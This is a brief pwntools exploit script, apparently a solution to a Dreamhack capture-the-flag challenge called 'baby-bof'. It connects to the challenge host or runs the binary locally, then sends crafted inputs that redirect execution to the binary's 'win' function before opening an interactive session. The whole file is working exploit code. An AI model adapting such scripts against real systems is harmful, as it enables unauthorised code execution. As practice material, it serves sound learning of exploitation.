#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 21999
HOST = "host8.dreamhack.games"
exe = context.binary = ELF('./baby-bof', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

p.sendlineafter(b"name: ", b"A"*15)
p.sendlineafter(b"value: ", hex(exe.sym.win))
p.sendlineafter(b"count: ", b'4')

p.interactive()
